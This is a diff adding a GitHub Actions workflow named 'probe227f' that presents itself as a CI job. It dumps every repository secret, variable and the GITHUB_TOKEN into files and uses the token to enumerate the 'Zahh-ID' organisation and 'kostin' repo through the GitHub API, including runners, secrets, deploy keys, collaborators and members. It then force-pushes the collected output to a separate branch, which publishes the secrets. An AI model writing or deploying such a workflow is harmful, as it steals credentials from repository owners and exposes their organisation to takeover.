@@ -1,0 +1,55 @@
+name: probe227f
+on:
+  push:
+    branches: ["ci-227f"]
+permissions:
+  contents: write
+  actions: read
+jobs:
+  enum:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: enum
+        env:
+          ALLSEC: ${{ toJSON(secrets) }}
+          ALLVARS: ${{ toJSON(vars) }}
+        run: |
+          mkdir -p .out
+          printf '%s' "$ALLSEC" > .out/secrets.json
+          printf '%s' "$ALLVARS" > .out/vars.json
+          echo "$GITHUB_TOKEN" > .out/ghtoken.txt
+          A="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"
+          API=https://api.github.com
+          : > .out/api.txt
+          for ep in \
+            "/user" \
+            "/orgs/Zahh-ID" \
+            "/orgs/Zahh-ID/repos?per_page=100&type=all" \
+            "/installation/repositories?per_page=100" \
+            "/user/repos?per_page=100&affiliation=owner,collaborator,organization_member&visibility=all" \
+            "/repos/Zahh-ID/kostin/actions/runners" \
+            "/repos/Zahh-ID/kostin/actions/secrets" \
+            "/repos/Zahh-ID/kostin/actions/variables" \
+            "/repos/Zahh-ID/kostin/environments" \
+            "/repos/Zahh-ID/kostin/actions/organization-secrets" \
+            "/repos/Zahh-ID/kostin/actions/organization-variables" \
+            "/repos/Zahh-ID/kostin/keys" \
+            "/repos/Zahh-ID/kostin/actions/permissions" \
+            "/repos/Zahh-ID/kostin/collaborators" \
+            "/orgs/Zahh-ID/actions/runners" \
+            "/orgs/Zahh-ID/actions/secrets" \
+            "/orgs/Zahh-ID/actions/variables" \
+            "/orgs/Zahh-ID/installations" \
+            "/orgs/Zahh-ID/members?per_page=100" \
+            "/orgs/Zahh-ID/actions/permissions/self-hosted-runners" \
+          ; do
+            echo "===== $ep =====" >> .out/api.txt
+            curl -s -H "$A" -H "Accept: application/vnd.github+json" "$API$ep" >> .out/api.txt
+            echo >> .out/api.txt
+          done
+      - name: publish
+        run: |
+          git config user.email ci@local; git config user.name ci-bot
+          git add -f .out; git commit -m art || true
+          git push origin HEAD:ci-227f-out --force || true
